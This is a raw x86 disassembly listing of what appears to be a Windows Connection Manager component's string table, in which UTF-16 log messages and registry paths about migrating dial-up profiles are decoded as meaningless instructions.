  4039a7:	add    BYTE PTR [ebp+0x0],cl
  4039aa:	imul   eax,DWORD PTR [eax],0x720067
  4039b0:	popa   
  4039b1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4039b5:	add    BYTE PTR [eax+0x0],dl
  4039b8:	push   0x6e006f00
  4039bd:	add    BYTE PTR [ebp+0x0],ah
  4039c0:	bound  eax,QWORD PTR [eax]
  4039c2:	outs   dx,DWORD PTR ds:[esi]
  4039c3:	add    BYTE PTR [edi+0x0],ch
  4039c6:	imul   eax,DWORD PTR [eax],0x45
  4039c9:	add    BYTE PTR [esi+0x0],ch
  4039cc:	je     0x4039ce
  4039ce:	jb     0x4039d0
  4039d0:	jns    0x4039d2
  4039d2:	and    BYTE PTR [eax],al
  4039d4:	data16 add BYTE PTR [edi+0x0],ch
  4039d8:	jb     0x4039da
  4039da:	and    BYTE PTR [eax],al
  4039dc:	jo     0x4039de
  4039de:	jb     0x4039e0
  4039e0:	outs   dx,DWORD PTR ds:[esi]
  4039e1:	add    BYTE PTR [esi+0x0],ah
  4039e4:	imul   eax,DWORD PTR [eax],0x65006c
  4039ea:	and    BYTE PTR [eax],al
  4039ec:	and    eax,0x20007300
  4039f1:	add    BYTE PTR [esi+0x0],ah
  4039f4:	popa   
  4039f5:	add    BYTE PTR [ecx+0x0],ch
  4039f8:	ins    BYTE PTR es:[edi],dx
  4039f9:	add    BYTE PTR [ebp+0x0],ah
  4039fc:	add    BYTE PTR fs:[esi],ch
  4039ff:	add    BYTE PTR [eax],ah
  403a01:	add    BYTE PTR [eax],ah
  403a03:	add    BYTE PTR [ebx+0x0],al
  403a06:	ins    DWORD PTR es:[edi],dx
  403a07:	add    BYTE PTR [eax+0x0],dh
  403a0a:	and    BYTE PTR [eax],al
  403a0c:	jo     0x403a0e
  403a0e:	popa   
  403a0f:	add    BYTE PTR [eax+eax*1+0x68],dh
  403a13:	add    BYTE PTR [eax],ah
  403a15:	add    BYTE PTR [ecx+0x0],ch
  403a18:	jae    0x403a1a
  403a1a:	and    BYTE PTR [eax],al
  403a1c:	and    eax,0x7300
  403a21:	add    BYTE PTR [eax],al
  403a23:	add    BYTE PTR [eax],al
  403a25:	add    BYTE PTR [eax],al
  403a27:	add    BYTE PTR [ebp+0x0],cl
  403a2a:	imul   eax,DWORD PTR [eax],0x720067
  403a30:	popa   
  403a31:	add    BYTE PTR [eax+eax*1+0x65],dh
  403a35:	add    BYTE PTR [ebx+0x0],al
  403a38:	ins    DWORD PTR es:[edi],dx
  403a39:	add    BYTE PTR [eax+0x0],dl
  403a3c:	jb     0x403a3e
  403a3e:	outs   dx,DWORD PTR ds:[esi]
  403a3f:	add    BYTE PTR [esi+0x0],ah
  403a42:	imul   eax,DWORD PTR [eax],0x65006c
  403a48:	jae    0x403a4a
  403a4a:	inc    esi
  403a4b:	add    BYTE PTR [edi+0x0],ch
  403a4e:	jb     0x403a50
  403a50:	push   edi
  403a51:	add    BYTE PTR [ecx+0x0],ch
  403a54:	outs   dx,BYTE PTR ds:[esi]
  403a55:	add    BYTE PTR [edx],dh
  403a57:	add    BYTE PTR [ebx+0x0],ch
  403a5a:	push   ebp
  403a5b:	add    BYTE PTR [eax+0x0],dh
  403a5e:	add    BYTE PTR [bp+si+0x0],dh
  403a62:	popa   
  403a63:	add    BYTE PTR [eax+eax*1+0x65],ah
  403a67:	add    BYTE PTR [eax],ah
  403a69:	add    BYTE PTR ds:0x20002d00,ch
  403a6f:	add    BYTE PTR [ebp+0x0],dl
  403a72:	jo     0x403a74
  403a74:	add    BYTE PTR fs:[ecx+0x0],ah
  403a78:	je     0x403a7a
  403a7a:	add    BYTE PTR gs:[eax+0x0],dl
  403a7e:	jb     0x403a80
  403a80:	outs   dx,DWORD PTR ds:[esi]
  403a81:	add    BYTE PTR [esi+0x0],ah
  403a84:	imul   eax,DWORD PTR [eax],0x65006c
  403a8a:	inc    esp
  403a8b:	add    BYTE PTR [ebp+0x0],ah
  403a8e:	jae    0x403a90
  403a90:	imul   eax,DWORD PTR [eax],0x74
  403a93:	add    BYTE PTR [edi+0x0],ch
  403a96:	jo     0x403a98
  403a98:	dec    ecx
  403a99:	add    BYTE PTR [ebx+0x0],ah
  403a9c:	outs   dx,DWORD PTR ds:[esi]
  403a9d:	add    BYTE PTR [esi+0x0],ch
  403aa0:	jae    0x403aa2
  403aa2:	dec    edi
  403aa3:	add    BYTE PTR [esi+0x0],ch
  403aa6:	dec    esi
  403aa7:	add    BYTE PTR [eax+eax*1+0x35],dl
  403aab:	add    BYTE PTR [eax],ah
  403aad:	add    BYTE PTR [esi+0x0],ah
  403ab0:	outs   dx,DWORD PTR ds:[esi]
  403ab1:	add    BYTE PTR [edx+0x0],dh
  403ab4:	and    BYTE PTR [eax],al
  403ab6:	jo     0x403ab8
  403ab8:	jb     0x403aba
  403aba:	outs   dx,DWORD PTR ds:[esi]
  403abb:	add    BYTE PTR [esi+0x0],ah
  403abe:	imul   eax,DWORD PTR [eax],0x65006c
  403ac4:	and    BYTE PTR [eax],al
  403ac6:	and    eax,0x20007300
  403acb:	add    BYTE PTR [esi+0x0],ah
  403ace:	popa   
  403acf:	add    BYTE PTR [ecx+0x0],ch
  403ad2:	ins    BYTE PTR es:[edi],dx
  403ad3:	add    BYTE PTR [ebp+0x0],ah
  403ad6:	add    BYTE PTR fs:[esi],ch
  403ad9:	add    BYTE PTR [eax],ah
  403adb:	add    BYTE PTR [eax],ah
  403add:	add    BYTE PTR [ebx+0x0],al
  403ae0:	ins    DWORD PTR es:[edi],dx
  403ae1:	add    BYTE PTR [eax+0x0],dh
  403ae4:	and    BYTE PTR [eax],al
  403ae6:	jo     0x403ae8
  403ae8:	popa   
  403ae9:	add    BYTE PTR [eax+eax*1+0x68],dh
  403aed:	add    BYTE PTR [eax],ah
  403aef:	add    BYTE PTR [ecx+0x0],ch
  403af2:	jae    0x403af4
  403af4:	and    BYTE PTR [eax],al
  403af6:	and    eax,0x7300
  403afb:	add    BYTE PTR [eax],al
  403afd:	add    BYTE PTR [eax],al
  403aff:	add    BYTE PTR [ebp+0x0],cl
  403b02:	imul   eax,DWORD PTR [eax],0x720067
  403b08:	popa   
  403b09:	add    BYTE PTR [eax+eax*1+0x65],dh
  403b0d:	add    BYTE PTR [ebx+0x0],al
  403b10:	ins    DWORD PTR es:[edi],dx
  403b11:	add    BYTE PTR [eax+0x0],dl
  403b14:	jb     0x403b16
  403b16:	outs   dx,DWORD PTR ds:[esi]
  403b17:	add    BYTE PTR [esi+0x0],ah
  403b1a:	imul   eax,DWORD PTR [eax],0x65006c
  403b20:	jae    0x403b22
  403b22:	inc    esi
  403b23:	add    BYTE PTR [edi+0x0],ch
  403b26:	jb     0x403b28
  403b28:	push   edi
  403b29:	add    BYTE PTR [ecx+0x0],ch
  403b2c:	outs   dx,BYTE PTR ds:[esi]
  403b2d:	add    BYTE PTR [edx],dh
  403b2f:	add    BYTE PTR [ebx+0x0],ch
  403b32:	push   ebp
  403b33:	add    BYTE PTR [eax+0x0],dh
  403b36:	add    BYTE PTR [bp+si+0x0],dh
  403b3a:	popa   
  403b3b:	add    BYTE PTR [eax+eax*1+0x65],ah
  403b3f:	add    BYTE PTR [eax],ah
  403b41:	add    BYTE PTR ds:0x20002d00,ch
  403b47:	add    BYTE PTR [edx+0x0],dl
  403b4a:	add    BYTE PTR gs:[ebp+0x0],ch
  403b4e:	outs   dx,DWORD PTR ds:[esi]
  403b4f:	add    BYTE PTR [esi+0x0],dh
  403b52:	add    BYTE PTR gs:[edi+0x0],cl
  403b56:	ins    BYTE PTR es:[edi],dx
  403b57:	add    BYTE PTR [eax+eax*1+0x43],ah
  403b5b:	add    BYTE PTR [ebp+0x0],ch
  403b5e:	dec    ecx
  403b5f:	add    BYTE PTR [esi+0x0],ch
  403b62:	jae    0x403b64
  403b64:	je     0x403b66
  403b66:	popa   
  403b67:	add    BYTE PTR [eax+eax*1+0x6c],ch
  403b6b:	add    BYTE PTR [ebx+0x0],dh
  403b6e:	and    BYTE PTR [eax],al
  403b70:	data16 add BYTE PTR [edi+0x0],ch
  403b74:	jb     0x403b76
  403b76:	and    BYTE PTR [eax],al
  403b78:	jo     0x403b7a
  403b7a:	jb     0x403b7c
  403b7c:	outs   dx,DWORD PTR ds:[esi]
  403b7d:	add    BYTE PTR [esi+0x0],ah
  403b80:	imul   eax,DWORD PTR [eax],0x65006c
  403b86:	and    BYTE PTR [eax],al
  403b88:	and    eax,0x20007300
  403b8d:	add    BYTE PTR [esi+0x0],ah
  403b90:	popa   
  403b91:	add    BYTE PTR [ecx+0x0],ch
  403b94:	ins    BYTE PTR es:[edi],dx
  403b95:	add    BYTE PTR [ebp+0x0],ah
  403b98:	add    BYTE PTR fs:[esi],ch
  403b9b:	add    BYTE PTR [eax],ah
  403b9d:	add    BYTE PTR [eax],ah
  403b9f:	add    BYTE PTR [ebx+0x0],al
  403ba2:	ins    DWORD PTR es:[edi],dx
  403ba3:	add    BYTE PTR [eax+0x0],dh
  403ba6:	and    BYTE PTR [eax],al
  403ba8:	jo     0x403baa
  403baa:	popa   
  403bab:	add    BYTE PTR [eax+eax*1+0x68],dh
  403baf:	add    BYTE PTR [eax],ah
  403bb1:	add    BYTE PTR [ecx+0x0],ch
  403bb4:	jae    0x403bb6
  403bb6:	and    BYTE PTR [eax],al
  403bb8:	and    eax,0x7300
  403bbd:	add    BYTE PTR [eax],al
  403bbf:	add    BYTE PTR [ebx+0x0],dl
  403bc2:	outs   dx,DWORD PTR ds:[esi]
  403bc3:	add    BYTE PTR [esi+0x0],ah
  403bc6:	je     0x403bc8
  403bc8:	ja     0x403bca
  403bca:	popa   
  403bcb:	add    BYTE PTR [edx+0x0],dh
  403bce:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  403bd3:	add    BYTE PTR [ecx+0x0],ch
  403bd6:	arpl   WORD PTR [eax],ax
  403bd8:	jb     0x403bda
  403bda:	outs   dx,DWORD PTR ds:[esi]
  403bdb:	add    BYTE PTR [ebx+0x0],dh
  403bde:	outs   dx,DWORD PTR ds:[esi]
  403bdf:	add    BYTE PTR [esi+0x0],ah
  403be2:	je     0x403be4
  403be4:	pop    esp
  403be5:	add    BYTE PTR [edi+0x0],dl
  403be8:	imul   eax,DWORD PTR [eax],0x64006e
  403bee:	outs   dx,DWORD PTR ds:[esi]
  403bef:	add    BYTE PTR [edi+0x0],dh
  403bf2:	jae    0x403bf4
  403bf4:	pop    esp
  403bf5:	add    BYTE PTR [ebx+0x0],al
  403bf8:	jne    0x403bfa
  403bfa:	jb     0x403bfc
  403bfc:	jb     0x403bfe
  403bfe:	add    BYTE PTR gs:[esi+0x0],ch
  403c02:	je     0x403c04
  403c04:	push   esi
  403c05:	add    BYTE PTR [ebp+0x0],ah
  403c08:	jb     0x403c0a
  403c0a:	jae    0x403c0c
  403c0c:	imul   eax,DWORD PTR [eax],0x6e006f
  403c12:	pop    esp
  403c13:	add    BYTE PTR [edx+0x0],dl
  403c16:	jne    0x403c18
  403c18:	outs   dx,BYTE PTR ds:[esi]
  403c19:	add    BYTE PTR [eax],al
  403c1b:	add    BYTE PTR [eax],al
  403c1d:	add    BYTE PTR [eax],al
  403c1f:	add    BYTE PTR [ebx+0x0],al
  403c22:	outs   dx,DWORD PTR ds:[esi]
  403c23:	add    BYTE PTR [esi+0x0],ch
  403c26:	outs   dx,BYTE PTR ds:[esi]
  403c27:	add    BYTE PTR [ebp+0x0],ah
  403c2a:	arpl   WORD PTR [eax],ax
  403c2c:	je     0x403c2e
  403c2e:	imul   eax,DWORD PTR [eax],0x6e006f
  403c34:	and    BYTE PTR [eax],al
  403c36:	dec    ebp
  403c37:	add    BYTE PTR [ecx+0x0],ah
  403c3a:	outs   dx,BYTE PTR ds:[esi]
  403c3b:	add    BYTE PTR [ecx+0x0],ah
  403c3e:	add    BYTE PTR [di+0x0],ah
  403c42:	jb     0x403c44
  403c44:	and    BYTE PTR [eax],al
  403c46:	push   eax
  403c47:	add    BYTE PTR [edx+0x0],dh
  403c4a:	outs   dx,DWORD PTR ds:[esi]
  403c4b:	add    BYTE PTR [esi+0x0],ah
  403c4e:	imul   eax,DWORD PTR [eax],0x65006c
  403c54:	jae    0x403c56
  403c56:	and    BYTE PTR [eax],al
  403c58:	push   ebp
  403c59:	add    BYTE PTR [eax+0x0],dh
  403c5c:	add    BYTE PTR [bp+si+0x0],dh
  403c60:	popa   
  403c61:	add    BYTE PTR [eax+eax*1+0x65],ah
  403c65:	add    BYTE PTR [eax],al
  403c67:	add    BYTE PTR [ebx+0x0],al
  403c6a:	dec    esi
  403c6b:	add    BYTE PTR [ecx+0x0],ah
  403c6e:	ins    DWORD PTR es:[edi],dx
  403c6f:	add    BYTE PTR [ebp+0x0],ah
  403c72:	add    BYTE PTR fs:[ebp+0x0],cl
  403c76:	jne    0x403c78
  403c78:	je     0x403c7a
  403c7a:	add    BYTE PTR gs:[eax+0x0],bh
  403c7e:	cmp    al,BYTE PTR [eax]
  403c80:	cmp    al,BYTE PTR [eax]
  403c82:	dec    esp
  403c83:	add    BYTE PTR [edi+0x0],ch
  403c86:	arpl   WORD PTR [eax],ax
  403c88:	imul   eax,DWORD PTR [eax],0x28
  403c8b:	add    BYTE PTR [ecx],ch
  403c8d:	add    BYTE PTR [eax],ah
  403c8f:	add    BYTE PTR ds:0x41002000,ch
  403c95:	add    BYTE PTR [eax+eax*1+0x74],dh
  403c99:	add    BYTE PTR [ebp+0x0],ah
  403c9c:	ins    DWORD PTR es:[edi],dx
  403c9d:	add    BYTE PTR [eax+0x0],dh
  403ca0:	je     0x403ca2
  403ca2:	imul   eax,DWORD PTR [eax],0x67006e
  403ca8:	and    BYTE PTR [eax],al
  403caa:	je     0x403cac
  403cac:	outs   dx,DWORD PTR ds:[esi]
  403cad:	add    BYTE PTR [eax],ah
  403caf:	add    BYTE PTR [ecx+0x0],ah
  403cb2:	arpl   WORD PTR [eax],ax
  403cb4:	jno    0x403cb6
  403cb6:	jne    0x403cb8
  403cb8:	imul   eax,DWORD PTR [eax],0x650072
  403cbe:	and    BYTE PTR [eax],al
  403cc0:	ins    DWORD PTR es:[edi],dx
  403cc1:	add    BYTE PTR [ebp+0x0],dh
  403cc4:	je     0x403cc6
  403cc6:	add    BYTE PTR gs:[eax+0x0],bh
  403cca:	and    BYTE PTR [eax],al
  403ccc:	sub    eax,0x25002000
  403cd1:	add    BYTE PTR [ebx+0x0],dh
  403cd4:	add    BYTE PTR [eax],al
  403cd6:	add    BYTE PTR [eax],al
  403cd8:	inc    ebx
  403cd9:	add    BYTE PTR [esi+0x0],cl
  403cdc:	popa   
  403cdd:	add    BYTE PTR [ebp+0x0],ch
  403ce0:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403ce5:	add    BYTE PTR [ebp+0x0],dh
  403ce8:	je     0x403cea
  403cea:	add    BYTE PTR gs:[eax+0x0],bh
  403cee:	cmp    al,BYTE PTR [eax]
  403cf0:	cmp    al,BYTE PTR [eax]
  403cf2:	dec    esp
  403cf3:	add    BYTE PTR [edi+0x0],ch
  403cf6:	arpl   WORD PTR [eax],ax
  403cf8:	imul   eax,DWORD PTR [eax],0x28
  403cfb:	add    BYTE PTR [ecx],ch
  403cfd:	add    BYTE PTR [eax],ah
  403cff:	add    BYTE PTR ds:0x4d002000,ch
  403d05:	add    BYTE PTR [ebp+0x0],dh
  403d08:	je     0x403d0a
  403d0a:	add    BYTE PTR gs:[eax+0x0],bh
  403d0e:	and    BYTE PTR [eax],al
  403d10:	popa   
  403d11:	add    BYTE PTR [eax+eax*1+0x72],ch
  403d15:	add    BYTE PTR [ebp+0x0],ah
  403d18:	popa   
  403d19:	add    BYTE PTR [eax+eax*1+0x79],ah
  403d1d:	add    BYTE PTR [eax],ah
  403d1f:	add    BYTE PTR [ebp+0x0],ah
  403d22:	js     0x403d24
  403d24:	imul   eax,DWORD PTR [eax],0x740073
  403d2a:	jae    0x403d2c
  403d2c:	and    BYTE PTR [eax],al
  403d2e:	sub    eax,0x25002000
  403d33:	add    BYTE PTR [ebx+0x0],dh
  403d36:	add    BYTE PTR [eax],al
  403d38:	inc    ebx
  403d39:	add    BYTE PTR [esi+0x0],cl
  403d3c:	popa   
  403d3d:	add    BYTE PTR [ebp+0x0],ch
  403d40:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403d45:	add    BYTE PTR [ebp+0x0],dh
  403d48:	je     0x403d4a
  403d4a:	add    BYTE PTR gs:[eax+0x0],bh
  403d4e:	cmp    al,BYTE PTR [eax]
  403d50:	cmp    al,BYTE PTR [eax]
  403d52:	dec    esp
  403d53:	add    BYTE PTR [edi+0x0],ch
  403d56:	arpl   WORD PTR [eax],ax
  403d58:	imul   eax,DWORD PTR [eax],0x28
  403d5b:	add    BYTE PTR [ecx],ch
  403d5d:	add    BYTE PTR [eax],ah
  403d5f:	add    BYTE PTR ds:0x4e002000,ch
  403d65:	add    BYTE PTR [edi+0x0],ch
  403d68:	je     0x403d6a
  403d6a:	and    BYTE PTR [eax],al
  403d6c:	ja     0x403d6e
  403d6e:	popa   
  403d6f:	add    BYTE PTR [ecx+0x0],ch
  403d72:	je     0x403d74
  403d74:	imul   eax,DWORD PTR [eax],0x67006e
  403d7a:	and    BYTE PTR [eax],al
  403d7c:	data16 add BYTE PTR [edi+0x0],ch
  403d80:	jb     0x403d82
  403d82:	and    BYTE PTR [eax],al
  403d84:	ins    DWORD PTR es:[edi],dx
  403d85:	add    BYTE PTR [ebp+0x0],dh
  403d88:	je     0x403d8a
  403d8a:	add    BYTE PTR gs:[eax+0x0],bh
  403d8e:	and    BYTE PTR [eax],al
  403d90:	sub    eax,0x25002000
  403d95:	add    BYTE PTR [ebx+0x0],dh
	...
  403da0:	inc    ebx
  403da1:	add    BYTE PTR [esi+0x0],cl
  403da4:	popa   
  403da5:	add    BYTE PTR [ebp+0x0],ch
  403da8:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403dad:	add    BYTE PTR [ebp+0x0],dh
  403db0:	je     0x403db2
  403db2:	add    BYTE PTR gs:[eax+0x0],bh
  403db6:	cmp    al,BYTE PTR [eax]
  403db8:	cmp    al,BYTE PTR [eax]
  403dba:	dec    esp
  403dbb:	add    BYTE PTR [edi+0x0],ch
  403dbe:	arpl   WORD PTR [eax],ax
  403dc0:	imul   eax,DWORD PTR [eax],0x28
  403dc3:	add    BYTE PTR [ecx],ch
  403dc5:	add    BYTE PTR [eax],ah
  403dc7:	add    BYTE PTR ds:0x45002000,ch
  403dcd:	add    BYTE PTR [esi+0x0],ch
  403dd0:	je     0x403dd2
  403dd2:	add    BYTE PTR gs:[edx+0x0],dh
  403dd6:	imul   eax,DWORD PTR [eax],0x67006e
  403ddc:	and    BYTE PTR [eax],al
  403dde:	dec    ebp
  403ddf:	add    BYTE PTR [ebp+0x0],dh
  403de2:	je     0x403de4
  403de4:	add    BYTE PTR gs:[eax+0x0],bh
  403de8:	and    BYTE PTR [eax],al
  403dea:	ja     0x403dec
  403dec:	popa   
  403ded:	add    BYTE PTR [ecx+0x0],ch
  403df0:	je     0x403df2
  403df2:	add    BYTE PTR [eax],al
  403df4:	add    BYTE PTR [eax],al
  403df6:	add    BYTE PTR [eax],al
  403df8:	inc    ebx
  403df9:	add    BYTE PTR [esi+0x0],cl
  403dfc:	popa   
  403dfd:	add    BYTE PTR [ebp+0x0],ch
  403e00:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403e05:	add    BYTE PTR [ebp+0x0],dh
  403e08:	je     0x403e0a
  403e0a:	add    BYTE PTR gs:[eax+0x0],bh
  403e0e:	cmp    al,BYTE PTR [eax]
  403e10:	cmp    al,BYTE PTR [eax]
  403e12:	dec    esp
  403e13:	add    BYTE PTR [edi+0x0],ch
  403e16:	arpl   WORD PTR [eax],ax
  403e18:	imul   eax,DWORD PTR [eax],0x28
  403e1b:	add    BYTE PTR [ecx],ch
  403e1d:	add    BYTE PTR [eax],ah
  403e1f:	add    BYTE PTR ds:0x4d002000,ch
  403e25:	add    BYTE PTR [ebp+0x0],dh
  403e28:	je     0x403e2a
  403e2a:	add    BYTE PTR gs:[eax+0x0],bh
  403e2e:	and    BYTE PTR [eax],al
  403e30:	ja     0x403e32
  403e32:	popa   
  403e33:	add    BYTE PTR [ebx+0x0],dh
  403e36:	and    BYTE PTR [eax],al
  403e38:	popa   
  403e39:	add    BYTE PTR [edx+0x0],ah
  403e3c:	popa   
  403e3d:	add    BYTE PTR [esi+0x0],ch
  403e40:	add    BYTE PTR fs:[edi+0x0],ch
  403e44:	outs   dx,BYTE PTR ds:[esi]
  403e45:	add    BYTE PTR [ebp+0x0],ah
  403e48:	add    BYTE PTR fs:[eax],ah
  403e4b:	add    BYTE PTR [edx+0x0],ah
  403e4e:	jns    0x403e50
  403e50:	and    BYTE PTR [eax],al
  403e52:	jo     0x403e54
  403e54:	jb     0x403e56
  403e56:	add    BYTE PTR gs:[esi+0x0],dh
  403e5a:	imul   eax,DWORD PTR [eax],0x75006f
  403e60:	jae    0x403e62
  403e62:	and    BYTE PTR [eax],al
  403e64:	outs   dx,DWORD PTR ds:[esi]
  403e65:	add    BYTE PTR [edi+0x0],dh
  403e68:	outs   dx,BYTE PTR ds:[esi]
  403e69:	add    BYTE PTR [ebp+0x0],ah
  403e6c:	jb     0x403e6e
  403e6e:	and    BYTE PTR [eax],al
  403e70:	sub    eax,0x25002000
  403e75:	add    BYTE PTR [ebx+0x0],dh
	...
  403e80:	inc    ebx
  403e81:	add    BYTE PTR [esi+0x0],cl
  403e84:	popa   
  403e85:	add    BYTE PTR [ebp+0x0],ch
  403e88:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403e8d:	add    BYTE PTR [ebp+0x0],dh
  403e90:	je     0x403e92
  403e92:	add    BYTE PTR gs:[eax+0x0],bh
  403e96:	cmp    al,BYTE PTR [eax]
  403e98:	cmp    al,BYTE PTR [eax]
  403e9a:	dec    esp
  403e9b:	add    BYTE PTR [edi+0x0],ch
  403e9e:	arpl   WORD PTR [eax],ax
  403ea0:	imul   eax,DWORD PTR [eax],0x28
  403ea3:	add    BYTE PTR [ecx],ch
  403ea5:	add    BYTE PTR [eax],ah
  403ea7:	add    BYTE PTR ds:0x4d002000,ch
  403ead:	add    BYTE PTR [ebp+0x0],dh
  403eb0:	je     0x403eb2
  403eb2:	add    BYTE PTR gs:[eax+0x0],bh
  403eb6:	and    BYTE PTR [eax],al
  403eb8:	popa   
  403eb9:	add    BYTE PTR [ebx+0x0],ah
  403ebc:	jno    0x403ebe
  403ebe:	jne    0x403ec0
  403ec0:	imul   eax,DWORD PTR [eax],0x650072
  403ec6:	add    BYTE PTR fs:[eax],ah
  403ec9:	add    BYTE PTR ds:0x25002000,ch
  403ecf:	add    BYTE PTR [ebx+0x0],dh
  403ed2:	add    BYTE PTR [eax],al
  403ed4:	add    BYTE PTR [eax],al
  403ed6:	add    BYTE PTR [eax],al
  403ed8:	inc    ebx
  403ed9:	add    BYTE PTR [esi+0x0],cl
  403edc:	popa   
  403edd:	add    BYTE PTR [ebp+0x0],ch
  403ee0:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403ee5:	add    BYTE PTR [ebp+0x0],dh
  403ee8:	je     0x403eea
  403eea:	add    BYTE PTR gs:[eax+0x0],bh
  403eee:	cmp    al,BYTE PTR [eax]
  403ef0:	cmp    al,BYTE PTR [eax]
  403ef2:	dec    esp
  403ef3:	add    BYTE PTR [edi+0x0],ch
  403ef6:	arpl   WORD PTR [eax],ax
  403ef8:	imul   eax,DWORD PTR [eax],0x28
  403efb:	add    BYTE PTR [ecx],ch
  403efd:	add    BYTE PTR [eax],ah
  403eff:	add    BYTE PTR ds:0x4d002000,ch
  403f05:	add    BYTE PTR [ebp+0x0],dh
  403f08:	je     0x403f0a
  403f0a:	add    BYTE PTR gs:[eax+0x0],bh
  403f0e:	and    BYTE PTR [eax],al
  403f10:	ja     0x403f12
  403f12:	popa   
  403f13:	add    BYTE PTR [ecx+0x0],ch
  403f16:	je     0x403f18
  403f18:	and    BYTE PTR [eax],al
  403f1a:	je     0x403f1c
  403f1c:	imul   eax,DWORD PTR [eax],0x65006d
  403f22:	add    BYTE PTR fs:[eax],ah
  403f25:	add    BYTE PTR [edi+0x0],ch
  403f28:	jne    0x403f2a
  403f2a:	je     0x403f2c
  403f2c:	and    BYTE PTR [eax],al
  403f2e:	sub    eax,0x25002000
  403f33:	add    BYTE PTR [ebx+0x0],dh
  403f36:	add    BYTE PTR [eax],al
  403f38:	inc    ebx
  403f39:	add    BYTE PTR [esi+0x0],cl
  403f3c:	popa   
  403f3d:	add    BYTE PTR [ebp+0x0],ch
  403f40:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  403f45:	add    BYTE PTR [ebp+0x0],dh
  403f48:	je     0x403f4a
  403f4a:	add    BYTE PTR gs:[eax+0x0],bh
  403f4e:	cmp    al,BYTE PTR [eax]
  403f50:	cmp    al,BYTE PTR [eax]
  403f52:	dec    esp
  403f53:	add    BYTE PTR [edi+0x0],ch
  403f56:	arpl   WORD PTR [eax],ax
  403f58:	imul   eax,DWORD PTR [eax],0x28
  403f5b:	add    BYTE PTR [ecx],ch
  403f5d:	add    BYTE PTR [eax],ah
  403f5f:	add    BYTE PTR ds:0x4d002000,ch
  403f65:	add    BYTE PTR [ebp+0x0],dh
  403f68:	je     0x403f6a
  403f6a:	add    BYTE PTR gs:[eax+0x0],bh
  403f6e:	and    BYTE PTR [eax],al
  403f70:	ja     0x403f72
  403f72:	popa   
  403f73:	add    BYTE PTR [ecx+0x0],ch
  403f76:	je     0x403f78
  403f78:	and    BYTE PTR [eax],al
  403f7a:	data16 add BYTE PTR [ecx+0x0],ah
  403f7e:	imul   eax,DWORD PTR [eax],0x65006c
  403f84:	add    BYTE PTR fs:[eax],ah
  403f87:	add    BYTE PTR [esi+0x0],ah
  403f8a:	outs   dx,DWORD PTR ds:[esi]
  403f8b:	add    BYTE PTR [edx+0x0],dh
  403f8e:	and    BYTE PTR [eax],al
  403f90:	and    al,BYTE PTR [eax]
  403f92:	and    eax,0x22007300
  403f97:	add    BYTE PTR [eax],ah
  403f99:	add    BYTE PTR [edi+0x0],dh
  403f9c:	imul   eax,DWORD PTR [eax],0x680074
  403fa2:	and    BYTE PTR [eax],al
  403fa4:	inc    edi
  403fa5:	add    BYTE PTR [eax+eax*1+0x45],cl
  403fa9:	add    BYTE PTR ds:0x64002500,bh
	...
  403fb7:	add    BYTE PTR [ebx+0x0],dl
  403fba:	dec    edi
  403fbb:	add    BYTE PTR [esi+0x0],al
  403fbe:	push   esp
  403fbf:	add    BYTE PTR [edi+0x0],dl
  403fc2:	inc    ecx
  403fc3:	add    BYTE PTR [edx+0x0],dl
  403fc6:	inc    ebp
  403fc7:	add    BYTE PTR [eax+eax*1+0x4d],bl
  403fcb:	add    BYTE PTR [ecx+0x0],ch
  403fce:	arpl   WORD PTR [eax],ax
  403fd0:	jb     0x403fd2
  403fd2:	outs   dx,DWORD PTR ds:[esi]
  403fd3:	add    BYTE PTR [ebx+0x0],dh
  403fd6:	outs   dx,DWORD PTR ds:[esi]
  403fd7:	add    BYTE PTR [esi+0x0],ah
  403fda:	je     0x403fdc
  403fdc:	pop    esp
  403fdd:	add    BYTE PTR [ebx+0x0],al
  403fe0:	outs   dx,DWORD PTR ds:[esi]
  403fe1:	add    BYTE PTR [esi+0x0],ch
  403fe4:	outs   dx,BYTE PTR ds:[esi]
  403fe5:	add    BYTE PTR [ebp+0x0],ah
  403fe8:	arpl   WORD PTR [eax],ax
  403fea:	je     0x403fec
  403fec:	imul   eax,DWORD PTR [eax],0x6e006f
  403ff2:	and    BYTE PTR [eax],al
  403ff4:	dec    ebp
  403ff5:	add    BYTE PTR [ecx+0x0],ah
  403ff8:	outs   dx,BYTE PTR ds:[esi]
  403ff9:	add    BYTE PTR [ecx+0x0],ah
  403ffc:	add    BYTE PTR [di+0x0],ah
  404000:	jb     0x404002
  404002:	pop    esp
  404003:	add    BYTE PTR [ebp+0x0],dl
  404006:	jae    0x404008
  404008:	add    BYTE PTR gs:[edx+0x0],dh
  40400c:	dec    ecx
  40400d:	add    BYTE PTR [esi+0x0],ch
  404010:	data16 add BYTE PTR [edi+0x0],ch
  404014:	pop    esp
  404015:	add    BYTE PTR [eax],al
  404017:	add    BYTE PTR [ebx+0x0],dl
  40401a:	dec    edi
  40401b:	add    BYTE PTR [esi+0x0],al
  40401e:	push   esp
  40401f:	add    BYTE PTR [edi+0x0],dl
  404022:	inc    ecx
  404023:	add    BYTE PTR [edx+0x0],dl
  404026:	inc    ebp
  404027:	add    BYTE PTR [eax+eax*1+0x4d],bl
  40402b:	add    BYTE PTR [ecx+0x0],ch
  40402e:	arpl   WORD PTR [eax],ax
  404030:	jb     0x404032
  404032:	outs   dx,DWORD PTR ds:[esi]
  404033:	add    BYTE PTR [ebx+0x0],dh
  404036:	outs   dx,DWORD PTR ds:[esi]
  404037:	add    BYTE PTR [esi+0x0],ah
  40403a:	je     0x40403c
  40403c:	pop    esp
  40403d:	add    BYTE PTR [ebx+0x0],al
  404040:	outs   dx,DWORD PTR ds:[esi]
  404041:	add    BYTE PTR [esi+0x0],ch
  404044:	outs   dx,BYTE PTR ds:[esi]
  404045:	add    BYTE PTR [ebp+0x0],ah
  404048:	arpl   WORD PTR [eax],ax
  40404a:	je     0x40404c
  40404c:	imul   eax,DWORD PTR [eax],0x6e006f
  404052:	and    BYTE PTR [eax],al
  404054:	dec    ebp
  404055:	add    BYTE PTR [ecx+0x0],ah
  404058:	outs   dx,BYTE PTR ds:[esi]
  404059:	add    BYTE PTR [ecx+0x0],ah
  40405c:	add    BYTE PTR [di+0x0],ah
